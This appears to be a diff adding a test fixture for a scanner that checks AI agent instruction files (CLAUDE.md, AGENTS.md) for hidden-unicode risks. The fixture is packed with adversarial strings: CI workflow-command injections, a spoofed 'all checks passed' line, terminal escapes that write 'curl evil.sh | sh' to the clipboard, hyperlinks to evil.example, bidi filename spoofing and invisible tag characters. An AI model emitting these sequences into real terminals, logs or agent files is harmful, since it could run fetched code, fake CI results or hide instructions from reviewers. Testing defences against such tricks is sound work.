@@ -1,0 +1,26 @@
+!! x⏎::add-mask::secret⏎::set-output name=a::b
+review  evil:rule,title=x  copy<U+001B>]52;c;Y3VybCBldmlsLnNoIHwgc2g=<U+0007>done <U+001B>[2J<U+001B>[Hcleared <U+001B>]8;;https://evil.example<U+001B>\click<U+001B>]8;;<U+001B>\ eight-bit <U+009B>31mCSI<U+009B>0m and NEL<U+0085> safe text⏎FAKE: all checks passed line one⏎::stop-commands::x line one⏎::error::fake annotation x⏎::add-mask::secret⏎::set-output name=a::b invoice<U+202E>txt.exe and <U+202A>embed<U+202C> <U+200E><U+200F><U+061C> <U+2066>isolated<U+2069> <U+2067>rtl<U+2069> <U+2068>fs<U+2069> zero<U+200B>width<U+200C>non<U+200D>joiner<U+2060>word<U+FEFF>bom tags<U+E0001><U+E0049><U+E0067><U+E006E><U+E007F>end plain<U+FE0F> text<U+FE0E> and smuggled 😀️<U+FE0F><U+E0100><U+E0101> lone <U+D800> high and <U+DC00> low nul<U+0000>del<U+007F>bell<U+0007>bs<U+0008> ls<U+2028>ps<U+2029> ping @octocat and @github/security-team, mail me@example.…
+--- a/evil<U+001B>]52;c;cHduZWQ=<U+0007>/CLAUDE.md
++++ b/evil<U+001B>]52;c;cHduZWQ=<U+0007>/CLAUDE.md
+@@ -1,9 +1,12 @@
++x
+ <U+003A>:stop-commands::x
+   <U+003A>:error::fake annotation
+ copy<U+001B>]52;c;Y3VybCBldmlsLnNoIHwgc2g=<U+0007>done
+ <U+001B>]8;;https://evil.example<U+001B>\click<U+001B>]8;;<U+001B>\
+ invoice<U+202E>txt.exe and <U+202A>embed<U+202C> <U+200E><U+200F><U+061C>
+ tags<U+E0001><U+E0049><U+E0067><U+E006E><U+E007F>end
++zero<U+200B>width<U+200C>non<U+200D>joiner<U+2060>word<U+FEFF>bom
+ safe text⏎FAKE: all checks passed
+ eight-bit <U+009B>31mCSI<U+009B>0m and NEL<U+0085>
+ nul<U+0000>del<U+007F>bell<U+0007>bs<U+0008>
++::add-mask::y
+  effect: Codex in <U+2066>isolated<U+2069> <U+2067>rtl<U+2069> <U+2068>fs<U+2069> session start ≈1 → ≈2 tokens
+  effect: <U+001B>]8;;https://evil.example<U+001B>\click<U+001B>]8;;<U+001B>\ (gate class hooks)
+  note: line one⏎::stop-commands::x
+  note: line one⏎::error::fake annotation
+!! x⏎::add-mask::secret⏎::set-output name=a::b
+
+manual  evil:rule,title=x  notes⏎::stop-commands::x/AGENTS.md:2  copy<U+001B>]52;c;Y3VybCBldmlsLnNoIHwgc2g=<U+0007>done <U+001B>[2J<U+001B>[Hcleared <U+001B>]8;;https://evil.example<U+001B>\click<U+001B>]8;;<U+001B>\ eight-bit <U+009B>31mCSI<U+009B>0m and NEL<U+0085> safe text⏎FAKE: all checks passed line one⏎::stop-commands::x line one⏎::error::fake annotation x⏎::add-mask::secret⏎::set-output name=a::b invoice<U+202E>txt.exe and <U+202A>embed<U+202C> <U+200E><U+200F><U+061C> <U+2066>isolated<U+2069> <U+2067>rtl<U+2069> <U+2068>fs<U+2069> zero<U+200B>width<U+200C>non<U+200D>joiner<U+2060>word<U+FEFF>bom tags<U+E0001><U+E0049><U+E0067><U+E006E><U+E007F>end plain<U+FE0F> text<U+FE0E> and smuggled 😀️<U+FE0F><U+E0100><U+E0101> lone <U+D800> high and <U+DC00> low nul<U+0000>del<U+007F>bell<U+0007>bs<U+0008> ls<U+2028>ps<U+2029> ping @octocat and @github/security-team, mail me@example.…
+Verified on an in-memory copy: 1 finding resolved, 1 new, 1 left.
+  new info  evil<U+001B>]52;c;cHduZWQ=<U+0007>/CLAUDE.md:1  risk/hidden-unicode  line one⏎::error::fake annotation
